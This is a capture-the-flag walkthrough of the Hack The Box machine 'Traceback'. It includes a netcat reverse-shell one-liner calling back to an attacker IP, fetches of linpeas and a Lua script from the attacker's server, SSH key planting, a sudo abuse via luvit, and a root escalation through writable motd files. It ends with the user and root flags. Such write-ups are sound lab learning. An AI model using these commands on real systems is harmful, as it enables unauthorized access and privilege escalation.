# Traceback - Easy

```shell
sudo vim /etc/hosts
#add traceback.htb

nmap -T4 -p- -A -Pn -v traceback.htb

gobuster dir -u http://traceback.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

#search for uploaded webshells
ffuf -u http://traceback.htb/FUZZ -w /usr/share/wordlists/seclists/Web-Shells/backdoor_list.txt
#this gives us smevk.php

nc -nvlp 4444
#execute reverse shell one-liner

whoami
#webadmin

which python3

#upgrade to stable shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
#use Ctrl+Z to background shell

stty raw -echo; fg
#press enter twice

ls -la /opt

ls -la /home

ls -la /home/webadmin

cd /home/webadmin
#check note and .bash_history

ls -la .ssh
#we can add our authorized keys here

#in attacker machine
ssh-keygen -f webadmin
#generates webadmin and webadmin.pub

cat webadmin.pub
#copy public key

#paste it in webadmin .ssh
echo "ssh-rsa ... " > .ssh/authorized_keys

#now we can login via SSH
ssh -i webadmin webadmin@traceback.htb

#in attacker machine
python3 -m http.server

#in ssh
wget http://10.10.14.4:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

sudo -l
#we can run luvit program as 'sysadmin' user

sudo -u sysadmin /home/sysadmin/luvit
#we can exit this

#command from .bash_history
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
#this gives traceback error

#create program to write SSH key for sysadmin
#in attacker machine
ssh-keygen -f sysadmin

cat sysadmin.pub
#copy public key

vim writekeys.lua
#program to write to /home/sysadmin/.ssh/authorized_keys

python3 -m http.server

#in ssh session
wget http://10.10.14.4:8000/writekeys.lua

sudo -u sysadmin /home/sysadmin/luvit writekeys.lua
#executed without error

#ssh as sysadmin
ssh -i sysadmin sysadmin@traceback.htb

bash
#use bash shell

ls -la
#get user flag

#run linpeas

ls -la /etc/update-motd.d/
#these files are writable
#we can make them print root flag

cd /etc/update-motd.d/

vi 00-header
#delete the message line
#and enter 'cat /root/root.txt'

#in a new tab, log into SSH
#get root flag printed
ssh -i sysadmin sysadmin@traceback.htb
```

```lua
file = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
io.output(file)
io.write("ssh-rsa...")
io.close(file)
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29

* Checking the webpage, it seems to be 'owned'; furthermore, it mentions that it has left a backdoor.

* Going through the source code of the webpage, we can see a comment - "Some of the best web shells that you might need"

* We can begin to scan the web directories using ```gobuster``` to check for clues.

* From the info enumerated on webpage so far, we can see that there is a backdoor uploaded - we can attempt to fuzz it using ```ffuf```.

* For this fuzzing operation, we can use a wordlist specifically made for webshells and backdoors.

* Googling the comment we found earlier gives us this [repo](https://github.com/TheBinitGhimire/Web-Shells)

* We can create a wordlist using these webshell names; alternatively we can use the ```backdoor_list.txt``` wordlist from ```seclists```.

* Using ```ffuf```, we can search for the webshell; we get a file 'smevk.php' with status code 200.

* Visiting /smevk.php, we are greeted with a login page for the backdoor - we can check this webshell from the repo found earlier and we get the creds "admin:admin".

* We can login using these creds, giving us access to the backdoor dashboard.

* This contains a field for 'Execute', and we can execute commands here.

* We can setup a listener, and execute the reverse-shell liner command here to get reverse shell:

```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f```

* We now get shell as 'webadmin'; we can stabilize our shell now.

* We have a home directory for webadmin, we can check that out.

* The home directory contains 'note.txt', which suggests the presence of a ```Lua``` tool.

* There is also webadmin's '.bash_history' file, which shows there is a file 'privesc.lua' in another user's (sysadmin) home directory.

* Now, there is a .ssh folder with empty 'authorized_keys'; we can add our own here in order to login via SSH.

* Once we login via SSH, we can check for privesc vectors using ```linpeas```.

* Using ```sudo -l```, we can see that we can run '/home/sysadmin/luvit' as 'sysadmin' user.

* We know that the .bash_history file contained a 'sudo' command run as sysadmin, and it included a .lua file.

* So, with the help of the script, we can also run our own .lua files.

* We can create a .lua program to write our SSH keys into sysadmin's .ssh folder, similar to how we did with webadmin.

* We do not need to use ```chmod 600``` in this case as the authorized_keys file would already exist.

* After writing the Lua script, we can transfer it to the victim SSH session, and run it using ```luvit``` program.

* Then, we can login as sysadmin via SSH, and get user flag.

* Running ```linpeas``` as sysadmin user shows some interesting group writable files.

* The message-of-the-day files in '/etc/update-motd.d/' files are group-writable - we can use that to our advantage.

* The '00-header' file is printed every time someone logs in via SSH, so we can edit this to print root flag.

* We can get root flag by logging into SSH in a new tab.

```markdown
1. User flag - 22a716001f74b092a8e9810d993948cd

2. Root flag - 76a1155af3a5f5d3e9084e2c87eeb104
```
